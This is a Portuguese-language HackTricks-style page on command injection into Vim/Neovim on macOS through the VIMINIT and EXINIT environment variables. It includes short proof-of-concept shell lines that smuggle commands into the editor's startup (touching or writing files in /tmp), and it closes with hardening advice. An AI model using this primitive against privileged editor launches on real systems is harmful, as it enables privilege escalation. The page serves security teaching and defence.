# Injeção em Aplicações Vim/Neovim do macOS

{{#include ../../../banners/hacktricks-training.md}}

## Visão geral

A própria linguagem de scripting do Vim (Vimscript) pode executar **comandos Ex arbitrários e comandos shell na inicialização** a partir de variáveis de ambiente. Se um processo mais privilegiado (um workflow de manutenção/root, um `sudo vim …`, um editor iniciado por outra ferramenta, `crontab -e`, `visudo`, `git`/`less` invocando um editor, …) iniciar o Vim/Neovim com um ambiente influenciado pelo atacante, o atacante obterá execução de código nesse contexto.

## `VIMINIT`

Durante a inicialização, o Vim lê e executa os comandos Ex em **`VIMINIT`**. Os comandos Ex incluem `:!cmd` (executa um comando shell) e `:call system(...)`, portanto uma única variável permite execução arbitrária antes que qualquer arquivo seja editado.<sup>[[1]](#references)</sup>
```bash
echo "hi" > /tmp/victim.txt

# Shell command via Ex ':!'
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
ls -la /tmp/vim-executed

# Pure Vimscript (no external process, e.g. write a file)
printf ':qa!\n' | VIMINIT='call writefile(["x"],"/tmp/vim-vimscript")' vim /tmp/victim.txt
```
O `:qa!` fornecido via stdin apenas fecha o editor depois que o payload já foi executado; em um cenário real, a vítima simplesmente abre o Vim normalmente.

## `EXINIT`

Se `VIMINIT` não estiver definido, o Vim (e os binários de compatibilidade `vi`/`ex`) recorre ao **`EXINIT`**, que é executado da mesma forma. Essa é a variante clássica, da era do vi, da mesma primitiva.<sup>[[1]](#references)</sup>
```bash
printf ':qa!\n' | EXINIT='silent! !touch /tmp/exinit-executed' vim /tmp/victim.txt
ls -la /tmp/exinit-executed
```
## Notas e ressalvas

- **Neovim** também respeita `VIMINIT` (ele é verificado antes do `init.vim`/`init.lua` do usuário).
- O modo Batch/Ex (`vim -es` / `vim -Es`) **não** carrega `VIMINIT`/`EXINIT`; as variáveis são executadas em uma inicialização normal (interativa), que é o cenário comum da vítima.
- Vetores relacionados baseados em arquivos são os recursos `exrc`/`.nvimrc` "modeline"/local-rc por diretório e `-u <vimrc>`; o caminho da variável de ambiente acima não requer nenhum arquivo gravável.

## Hardening

- Sanitize o ambiente (remova `VIMINIT`/`EXINIT`) antes de iniciar editores a partir de contextos privilegiados ou automatizados e prefira wrappers `sudo -i`/`env -i` que redefinam o ambiente.
- Defina `EDITOR`/`VISUAL` como caminhos absolutos confiáveis e evite executar editores como root com um ambiente de usuário herdado.
- Trate o controle sobre o ambiente de um alvo como equivalente à execução de código para qualquer Vim/Neovim que ele iniciar.

## References

- [1] [Documentação do Vim — `starting.txt` (inicialização, `VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
{{#include ../../../banners/hacktricks-training.md}}
